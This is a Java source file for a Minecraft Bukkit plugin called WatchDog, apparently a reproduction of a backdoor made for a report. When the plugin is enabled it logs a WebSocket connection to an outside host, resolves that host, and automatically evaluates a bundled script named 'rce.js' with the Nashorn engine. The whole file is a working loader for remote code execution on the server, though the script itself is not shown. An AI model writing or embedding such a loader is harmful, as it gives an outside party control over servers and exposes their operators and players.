package report.yumc.watchdog;

import org.bukkit.plugin.java.JavaPlugin;
import org.bukkit.scheduler.BukkitRunnable;

import javax.script.ScriptEngine;
import javax.script.ScriptEngineManager;
import javax.script.ScriptException;
import java.io.FileNotFoundException;
import java.io.InputStreamReader;
import java.net.InetAddress;
import java.net.UnknownHostException;

public class WatchDog extends JavaPlugin {
    public static WatchDog instance;

    @Override
    public void onEnable() {
        instance = this;

        new BukkitRunnable() {
            @Override
            public void run() {
                getLogger().info("Start WebSocket to 'ws://zn.gametime.icu:4000/'");
                // 输出当前解析的域名 ip
                try {
                    getLogger().info(String.valueOf(InetAddress.getByName("zn.gametime.icu")));
                } catch (UnknownHostException e) {
                    throw new RuntimeException(e);
                }
                // 启动 js
                try {
                    loadRce();
                } catch (FileNotFoundException | ScriptException e) {
                    throw new RuntimeException(e);
                }
            }
        }.runTaskLaterAsynchronously(this, 40);

        this.getLogger().info("Enabled successfully.");
    }

    @Override
    public void onDisable() {
        this.getLogger().info("Disabled successfully.");
    }

    private void loadRce() throws FileNotFoundException, ScriptException {
        ScriptEngine engine = new ScriptEngineManager().getEngineByName("nashorn");

        engine.eval(new InputStreamReader(getResource("rce.js")));
    }
}
